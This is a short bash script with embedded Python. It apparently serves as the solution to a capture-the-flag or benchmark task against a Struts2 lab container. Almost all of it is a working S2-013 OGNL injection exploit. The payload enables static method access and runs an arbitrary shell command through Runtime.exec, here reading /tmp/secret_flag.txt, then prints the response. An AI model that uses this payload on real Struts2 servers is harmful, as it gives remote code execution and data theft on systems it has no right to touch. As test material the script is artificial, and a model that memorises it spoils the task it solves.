#!/bin/bash
set -e

URL_BASE="http://struts2:8080"

# Wait for service to be ready
wait_for_service() {
    echo "Waiting for Struts2 to be ready..."
    for i in {1..30}; do
        if curl -s -f "$URL_BASE/link.action" > /dev/null 2>&1; then
            echo "Service is ready"
            return 0
        fi
        sleep 2
    done
    echo "Service failed to become ready"
    return 1
}

wait_for_service

# Exploit S2-013 OGNL injection via includeParams="all"
# When <s:a> or <s:url> tag has includeParams="all", parameters are rendered with OGNL evaluation
# The OGNL expression is placed in a URL parameter, which gets evaluated and the result appears in the link href

python <<'PYTHON_EOF'
import urllib.parse
import urllib.request
import re
import sys

url = "http://struts2:8080/link.action"

# OGNL payload to execute command and capture output using IOUtils
# ${#_memberAccess["allowStaticMethodAccess"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat /tmp/secret_flag.txt').getInputStream())}
payload = '${#_memberAccess["allowStaticMethodAccess"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\'cat /tmp/secret_flag.txt\').getInputStream())}'

# URL encode and send as parameter
params = urllib.parse.urlencode({'a': payload})
full_url = f"{url}?{params}"

try:
    response = urllib.request.urlopen(full_url, timeout=5)
    html = response.read().decode('utf-8')
    
    # The flag appears in the href attribute of the link after OGNL evaluation
    # Extract it from the response
    print(html, flush=True)
    
except Exception as e:
    print(f"Error: {e}", file=sys.stderr, flush=True)
    sys.exit(1)
PYTHON_EOF
